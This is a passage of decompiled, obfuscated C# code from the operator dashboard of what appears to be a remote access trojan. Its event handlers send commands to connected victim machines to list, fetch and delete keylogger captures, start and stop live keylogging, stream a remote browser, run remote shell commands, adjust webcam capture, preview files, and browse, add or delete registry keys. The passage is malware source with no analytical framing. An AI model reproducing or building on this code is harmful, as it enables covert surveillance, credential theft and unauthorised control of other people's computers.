				this.vmethod_556().Visible = true;
				this.vmethod_280().Clear();
				this.vmethod_280().Enabled = false;
				this.vmethod_388().Enabled = false;
				this.vmethod_712().Enabled = false;
				this.vmethod_702().Enabled = false;
				this.vmethod_704().Enabled = false;
				this.vmethod_280().Clear();
				this.vmethod_280().Enabled = false;
				string text = this.string_4;
				string text2 = "klgoff_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString()));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				return;
			}
			Interaction.MsgBox("No logs available!", MsgBoxStyle.Exclamation, Application.ProductName);
		}
	}

	// Token: 0x06000948 RID: 2376 RVA: 0x0004EAD8 File Offset: 0x0004CCD8
	private void method_233(object sender, EventArgs e)
	{
		if (this.vmethod_388().Items.Count == 0)
		{
			Interaction.MsgBox("No logs exists!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		checked
		{
			if (MessageBox.Show("Permanently delete all logs?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				StringBuilder stringBuilder = new StringBuilder();
				int num = this.vmethod_388().Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					stringBuilder.Append(Operators.ConcatenateObject(this.vmethod_388().Items[i].Tag, "|"));
				}
				this.vmethod_556().BringToFront();
				this.vmethod_556().Visible = true;
				this.vmethod_280().Clear();
				this.vmethod_280().Enabled = false;
				this.vmethod_388().Enabled = false;
				this.vmethod_712().Enabled = false;
				this.vmethod_702().Enabled = false;
				this.vmethod_704().Enabled = false;
				this.vmethod_280().Clear();
				this.vmethod_280().Enabled = false;
				string text = this.string_4;
				string text2 = "klgoff_del|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString()));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x06000949 RID: 2377 RVA: 0x0004EC80 File Offset: 0x0004CE80
	private void method_234(object sender, EventArgs e)
	{
		string text2;
		string text3;
		Class136.Class138 @class;
		if (Operators.CompareString(this.vmethod_706().Text, "Start", true) == 0)
		{
			string text = this.string_4;
			text2 = "klgonlinestart|1";
			text3 = text;
			@class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
				goto IL_E8;
			}
			catch (Exception ex)
			{
				goto IL_E8;
			}
		}
		string text4 = this.string_4;
		text2 = "klgonlinestop|1";
		text3 = text4;
		@class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex2)
		{
		}
		IL_E8:
		this.vmethod_706().Enabled = false;
	}

	// Token: 0x0600094A RID: 2378 RVA: 0x0004EDA0 File Offset: 0x0004CFA0
	private void method_235(object sender, EventArgs e)
	{
		if (Class130.concurrentDictionary_3.ContainsKey(this.string_4))
		{
			if (Operators.CompareString(this.vmethod_708().Text, "Start", true) == 0)
			{
				Class130.concurrentDictionary_3[this.string_4].REMOTE_BROWSER_IS_STREAMING = true;
				this.vmethod_466().Clear();
				this.vmethod_466().AppendText("Initializing...\r\n");
				string text = this.string_4;
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
				{
					"remotebrowser|",
					this.string_4,
					"|",
					Conversions.ToString(this.vmethod_714().Value),
					"|",
					Conversions.ToString(this.vmethod_464().Width),
					"|",
					Conversions.ToString(this.vmethod_464().Height),
					"|"
				}), Interaction.IIf(this.vmethod_678().Checked, "1", "0")), "|"), Interaction.IIf(this.vmethod_684().Checked, "1", "0")));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				this.vmethod_708().Text = "Stop";
				this.vmethod_708().Refresh();
				this.vmethod_464().Focus();
				this.vmethod_678().Enabled = false;
				this.vmethod_684().Enabled = false;
				return;
			}
			if (Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0)
			{
				this.vmethod_708().Enabled = false;
				this.vmethod_466().AppendText("Stopping remote browser...\r\n");
				string text4 = this.string_4;
				string text2 = "remotebrowser_stop|1";
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(Class130.concurrentDictionary_3[this.string_4].REMOTE_BROWSER_SOCKET_ID))
					{
						CClient cclient = Class130.concurrentDictionary_3[Class130.concurrentDictionary_3[this.string_4].REMOTE_BROWSER_SOCKET_ID];
						bool flag = true;
						cclient.SOCKET_DISCONNECT(ref flag);
					}
				}
				catch (Exception ex3)
				{
				}
				this.vmethod_678().Enabled = true;
				this.vmethod_684().Enabled = true;
				return;
			}
		}
		else
		{
			Interaction.MsgBox("You are not connected to the client!", MsgBoxStyle.Critical, Application.ProductName);
		}
	}

	// Token: 0x0600094B RID: 2379 RVA: 0x0004F0CC File Offset: 0x0004D2CC
	private void method_236(object sender, EventArgs e)
	{
		this.vmethod_352().Enabled = false;
		this.vmethod_510().Enabled = false;
		this.vmethod_352().Clear();
		this.vmethod_510().Clear();
		this.vmethod_710().Enabled = false;
		string text2;
		string text3;
		Class136.Class138 @class;
		if (Operators.CompareString(this.vmethod_710().Text, "Start", true) == 0)
		{
			string text = this.string_4;
			text2 = "shell_start|1";
			text3 = text;
			@class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
			return;
		}
		string text4 = this.string_4;
		text2 = "shell_stop|1";
		text3 = text4;
		@class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex2)
		{
		}
	}

	// Token: 0x0600094C RID: 2380 RVA: 0x0004E860 File Offset: 0x0004CA60
	private void method_237(object sender, EventArgs e)
	{
		this.vmethod_556().BringToFront();
		this.vmethod_556().Visible = true;
		this.vmethod_280().Clear();
		this.vmethod_280().Enabled = false;
		this.vmethod_388().Enabled = false;
		this.vmethod_712().Enabled = false;
		this.vmethod_702().Enabled = false;
		this.vmethod_704().Enabled = false;
		string text = this.string_4;
		string text2 = "klgoff_list|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600094D RID: 2381 RVA: 0x0004F218 File Offset: 0x0004D418
	private void method_238(object sender, ScrollEventArgs e)
	{
		this.vmethod_514().Text = Conversions.ToString(this.vmethod_714().Value) + "%";
		if (Operators.CompareString(this.string_4, null, true) != 0)
		{
			string text = this.string_4;
			string text2 = "remotebrowser_quality|" + Conversions.ToString(this.vmethod_714().Value);
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600094E RID: 2382 RVA: 0x0004F2E8 File Offset: 0x0004D4E8
	private void method_239(object sender, ColumnClickEventArgs e)
	{
		SortOrder sortOrder_;
		if (this.vmethod_578().Sorting == SortOrder.Descending)
		{
			this.vmethod_578().Sorting = SortOrder.Ascending;
			sortOrder_ = SortOrder.Ascending;
		}
		else
		{
			this.vmethod_578().Sorting = SortOrder.Descending;
			sortOrder_ = SortOrder.Descending;
		}
		this.vmethod_578().ListViewItemSorter = new Class143(e.Column, sortOrder_);
	}

	// Token: 0x0600094F RID: 2383 RVA: 0x0004F338 File Offset: 0x0004D538
	private void method_240(object sender, ScrollEventArgs e)
	{
		this.vmethod_254().Text = Conversions.ToString(this.vmethod_716().Value) + "%";
		if (Operators.CompareString(this.string_4, null, true) != 0)
		{
			string text = this.string_4;
			string text2 = "webcam_quality|" + Conversions.ToString(this.vmethod_716().Value);
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000950 RID: 2384 RVA: 0x0004F408 File Offset: 0x0004D608
	private void method_241(object sender, EventArgs e)
	{
		if (this.fThumb_0 == null)
		{
			this.fThumb_0 = new fThumb();
			this.fThumb_0.Opacity = 0.0;
			this.fThumb_0.Show();
		}
		else
		{
			this.fThumb_0.method_3();
		}
		if (this.fThumb_0 != null)
		{
			GClass7 gclass = this.vmethod_720();
			if (gclass.SelectedItems.Count > 0 && Class136.smethod_5(gclass.SelectedItems[0].Text))
			{
				this.fThumb_0.method_0(gclass.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
				this.fThumb_0.method_1();
				string text = this.string_4;
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", gclass.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x06000951 RID: 2385 RVA: 0x00006B01 File Offset: 0x00004D01
	private void method_242(object sender, FormatRowEventArgs e)
	{
		fDashboard.Class128 @class = (fDashboard.Class128)e.Model;
		e.Item.ForeColor = Color.Black;
	}

	// Token: 0x06000952 RID: 2386 RVA: 0x0004F5A8 File Offset: 0x0004D7A8
	private void method_243(object sender, ColumnClickEventArgs e)
	{
		SortOrder sortOrder_;
		if (this.vmethod_78().Sorting == SortOrder.Descending)
		{
			this.vmethod_78().Sorting = SortOrder.Ascending;
			sortOrder_ = SortOrder.Ascending;
		}
		else
		{
			this.vmethod_78().Sorting = SortOrder.Descending;
			sortOrder_ = SortOrder.Descending;
		}
		this.vmethod_78().ListViewItemSorter = new Class143(e.Column, sortOrder_);
	}

	// Token: 0x06000953 RID: 2387 RVA: 0x0004A0E8 File Offset: 0x000482E8
	private void method_244(object sender, EventArgs e)
	{
		this.vmethod_444().Text = "Selected: " + Conversions.ToString(this.vmethod_720().SelectedItems.Count);
		if (this.fThumb_0 != null && this.fThumb_0.Visible)
		{
			GClass7 gclass = this.vmethod_720();
			if (gclass.SelectedItems.Count > 0 && Class136.smethod_5(gclass.SelectedItems[0].Text))
			{
				this.fThumb_0.method_0(gclass.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
				string text = this.string_4;
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", gclass.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				this.fThumb_0.method_1();
			}
		}
	}

	// Token: 0x06000954 RID: 2388 RVA: 0x0004F5F8 File Offset: 0x0004D7F8
	private void method_245(object sender, MouseEventArgs e)
	{
		this.vmethod_598().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_578().SelectedItems.Count > 0, true, false));
		this.vmethod_586().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_578().SelectedItems.Count > 0, true, false));
	}

	// Token: 0x06000955 RID: 2389 RVA: 0x0004F670 File Offset: 0x0004D870
	private void method_246(object sender, EventArgs e)
	{
		this.vmethod_730().Enabled = false;
		this.vmethod_728().Enabled = false;
		this.vmethod_726().Enabled = false;
		this.vmethod_744().Enabled = false;
		this.vmethod_724().Enabled = false;
		this.vmethod_746().Enabled = false;
		this.vmethod_748().Enabled = false;
		this.string_7 = string.Empty;
		this.vmethod_734().Text = "Path: N/A";
		this.vmethod_748().Items.Clear();
		this.vmethod_750().Items.Clear();
		this.vmethod_754().BringToFront();
		this.vmethod_754().Visible = true;
		string text = this.string_4;
		string text2 = "reg_hkeys_get|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000956 RID: 2390 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_247(object sender, ToolStripItemClickedEventArgs e)
	{
	}

	// Token: 0x06000957 RID: 2391 RVA: 0x00006B1F File Offset: 0x00004D1F
	private void method_248(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 15;
		this.method_41();
	}

	// Token: 0x06000958 RID: 2392 RVA: 0x0004F79C File Offset: 0x0004D99C
	private void method_249(object sender, EventArgs e)
	{
		if (this.vmethod_746().Items.Count > 0)
		{
			this.collection_0.Clear();
			this.vmethod_746().Enabled = false;
			this.vmethod_748().Enabled = false;
			this.vmethod_750().Items.Clear();
			fDashboard.Class127 @class = (fDashboard.Class127)this.vmethod_746().SelectedItem;
			this.vmethod_754().BringToFront();
			this.vmethod_754().Visible = true;
			string text = this.string_4;
			string text2 = "reg_keys_root_get|" + Conversions.ToString(this.vmethod_746().SelectedIndex);
			string text3 = text;
			Class136.Class138 class2 = new Class136.Class138();
			class2.string_0 = text3;
			class2.string_1 = text2;
			class2.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
				{
					new Thread(new ThreadStart(class2._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000959 RID: 2393 RVA: 0x0004F8A8 File Offset: 0x0004DAA8
	private void method_250(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_624().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x0600095A RID: 2394 RVA: 0x0004F914 File Offset: 0x0004DB14
	private void method_251(object sender, ColumnClickEventArgs e)
	{
		SortOrder sortOrder_;
		if (this.vmethod_624().Sorting == SortOrder.Descending)
		{
			this.vmethod_624().Sorting = SortOrder.Ascending;
			sortOrder_ = SortOrder.Ascending;
		}
		else
		{
			this.vmethod_624().Sorting = SortOrder.Descending;
			sortOrder_ = SortOrder.Descending;
		}
		this.vmethod_624().ListViewItemSorter = new Class143(e.Column, sortOrder_);
	}

	// Token: 0x0600095B RID: 2395 RVA: 0x00006B34 File Offset: 0x00004D34
	private void method_252(object sender, EventArgs e)
	{
		this.vmethod_740().Text = "Selected: " + Conversions.ToString(this.vmethod_748().SelectedItems.Count);
	}

	// Token: 0x0600095C RID: 2396 RVA: 0x0004F964 File Offset: 0x0004DB64
	private void method_253(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			string text = this.string_4;
			string text2 = "shell_exec|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.vmethod_510().Text));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
			this.vmethod_510().Clear();
			this.vmethod_510().Select();
			e.Handled = true;
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x0600095D RID: 2397 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_254(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x0600095E RID: 2398 RVA: 0x0004FA3C File Offset: 0x0004DC3C
	private void method_255(object sender, EventArgs e)
	{
		checked
		{
			if (this.string_7.Length > 3)
			{
				this.collection_0.Add(this.string_7, null, null, null);
				this.vmethod_730().Enabled = false;
				if (Class136.smethod_20(this.string_7, '\\') > 1)
				{
					this.string_7 = Strings.Mid(this.string_7, 1, this.string_7.Length - 1);
					this.string_7 = Strings.Mid(this.string_7, 1, this.string_7.LastIndexOf("\\") + 1);
				}
				this.vmethod_730().Enabled = false;
				this.vmethod_728().Enabled = false;
				this.vmethod_726().Enabled = false;
				this.vmethod_744().Enabled = false;
				this.vmethod_724().Enabled = false;
				this.vmethod_746().Enabled = false;
				this.vmethod_748().Enabled = false;
				this.vmethod_750().Items.Clear();
				this.vmethod_754().BringToFront();
				this.vmethod_754().Visible = true;
				string text = this.string_4;
				string text2 = "reg_keys_get|" + this.string_7;
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x0600095F RID: 2399 RVA: 0x0004FBCC File Offset: 0x0004DDCC
	private void method_256(object sender, EventArgs e)
	{
		if (this.collection_0.Count > 0)
		{
			this.vmethod_730().Enabled = false;
			this.vmethod_728().Enabled = false;
			this.vmethod_726().Enabled = false;
			this.vmethod_744().Enabled = false;
			this.vmethod_724().Enabled = false;
			this.vmethod_746().Enabled = false;
			this.vmethod_748().Enabled = false;
			this.vmethod_750().Items.Clear();
			this.string_7 = Conversions.ToString(this.collection_0[this.collection_0.Count]);
			this.collection_0.Remove(this.collection_0.Count);
			this.vmethod_754().BringToFront();
			this.vmethod_754().Visible = true;
			string text = this.string_4;
			string text2 = "reg_keys_get|" + this.string_7;
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000960 RID: 2400 RVA: 0x0004FD20 File Offset: 0x0004DF20
	private void method_257(object sender, EventArgs e)
	{
		if (this.string_7.Length >= 3)
		{
			this.vmethod_730().Enabled = false;
			this.vmethod_728().Enabled = false;
			this.vmethod_726().Enabled = false;
			this.vmethod_744().Enabled = false;
			this.vmethod_724().Enabled = false;
			this.vmethod_746().Enabled = false;
			this.vmethod_748().Enabled = false;
			this.vmethod_750().Items.Clear();
			this.vmethod_750().BackColor = Color.White;
			this.vmethod_754().BringToFront();
			this.vmethod_754().Visible = true;
			string text = this.string_4;
			string text2 = "reg_keys_get|" + Strings.Split(this.string_7, "\\", -1, CompareMethod.Text)[0] + "\\";
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000961 RID: 2401 RVA: 0x0004FE60 File Offset: 0x0004E060
	private void method_258(object sender, EventArgs e)
	{
		if (this.string_7.Length >= 3)
		{
			this.vmethod_730().Enabled = false;
			this.vmethod_728().Enabled = false;
			this.vmethod_726().Enabled = false;
			this.vmethod_744().Enabled = false;
			this.vmethod_724().Enabled = false;
			this.vmethod_746().Enabled = false;
			this.vmethod_748().Enabled = false;
			this.vmethod_750().Items.Clear();
			this.vmethod_754().BringToFront();
			this.vmethod_754().Visible = true;
			string text = this.string_4;
			string text2 = "reg_keys_get|" + this.string_7;
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000962 RID: 2402 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_259(object sender, EventArgs e)
	{
	}

	// Token: 0x06000963 RID: 2403 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_260(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x06000964 RID: 2404 RVA: 0x0004FF7C File Offset: 0x0004E17C
	private void method_261(object sender, EventArgs e)
	{
		checked
		{
			if (this.fRegAdd_0 == null)
			{
				this.fRegAdd_0 = new fRegAdd();
				this.fRegAdd_0.Visible = true;
				this.fRegAdd_0.string_0 = this.string_4;
				this.fRegAdd_0.string_1 = this.string_7;
				Form form = this.fRegAdd_0;
				Rectangle workingArea = Screen.FromPoint(form.Location).WorkingArea;
				int x = workingArea.Left + (workingArea.Width - form.Width) / 2;
				int y = workingArea.Top + (workingArea.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				this.fRegAdd_0.Opacity = 100.0;
				return;
			}
			this.fRegAdd_0.Visible = true;
		}
	}

	// Token: 0x06000965 RID: 2405 RVA: 0x0005004C File Offset: 0x0004E24C
	private void method_262(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_750().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_750();
				if (MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject("Delete " + Conversions.ToString(gclass.SelectedItems.Count), Interaction.IIf(gclass.SelectedItems.Count > 1, " entries?", " entry?"))), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
				{
					int num = gclass.Items.Count - 1;
					string text2;
					string text3;
					Class136.Class138 @class;
					for (int i = 0; i <= num; i++)
					{
						if (gclass.Items[i].Selected)
						{
							string text = this.string_4;
							text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("reg_val_del|", gclass.Items[i].Tag), "|"), Convert.ToBase64String(Encoding.UTF8.GetBytes(gclass.Items[i].Text))));
							text3 = text;
							@class = new Class136.Class138();
							@class.string_0 = text3;
							@class.string_1 = text2;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					Thread.Sleep(200);
					string text4 = this.string_4;
					text2 = "reg_keys_get|" + this.string_7;
					text3 = text4;
					@class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex2)
					{
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000966 RID: 2406 RVA: 0x0005025C File Offset: 0x0004E45C
	private void method_263(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter new key name", Application.ProductName, string.Empty, -1, -1);
		if (text.Length != 0)
		{
			if (text.Length <= 255)
			{
				string text2 = this.string_4;
				string text3 = "reg_key_add|" + this.string_7 + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_7 + text));
				string text4 = text2;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text4;
				@class.string_1 = text3;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				return;
			}
			Interaction.MsgBox("Invalid key name!", MsgBoxStyle.Exclamation, Application.ProductName);
		}
	}

	// Token: 0x06000967 RID: 2407 RVA: 0x00050358 File Offset: 0x0004E558
	private void method_264(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_748().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_748();
				if (MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject("Delete " + Conversions.ToString(gclass.SelectedItems.Count), Interaction.IIf(gclass.SelectedItems.Count > 1, " keys?", " entry?"))), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
				{
					int num = gclass.Items.Count - 1;
					string text2;
					string text3;
					Class136.Class138 @class;
					for (int i = 0; i <= num; i++)
					{
						if (gclass.Items[i].Selected)
						{
							string text = this.string_4;
							text2 = "reg_key_del|" + this.string_7 + gclass.Items[i].Text;
							text3 = text;
							@class = new Class136.Class138();
							@class.string_0 = text3;
							@class.string_1 = text2;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					string text4 = this.string_4;
					text2 = "reg_keys_get|" + this.string_7;
					text3 = text4;
					@class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex2)
					{
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000968 RID: 2408 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_265(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x06000969 RID: 2409 RVA: 0x00006B60 File Offset: 0x00004D60
	private void method_266(object sender, EventArgs e)
	{
		this.vmethod_444().Text = "Selected: 0";
	}

	// Token: 0x0600096A RID: 2410 RVA: 0x00050530 File Offset: 0x0004E730
	private void method_267(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_720();
		if (Class136.smethod_5(gclass.SelectedItems[0].Text))
		{
			if (this.fThumb_0 == null)
			{
				this.fThumb_0 = new fThumb();
				this.fThumb_0.Opacity = 0.0;
				this.fThumb_0.Show();
			}
			else
			{
				this.fThumb_0.method_3();
			}
			if (this.fThumb_0 != null)
			{
				this.fThumb_0.method_0(gclass.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
				this.fThumb_0.method_1();
				string text = this.string_4;
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", gclass.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x0600096B RID: 2411 RVA: 0x000506C0 File Offset: 0x0004E8C0
	private void method_268(object sender, DrawItemEventArgs e)
	{
		checked
		{
			if (e.Index > -1)
			{
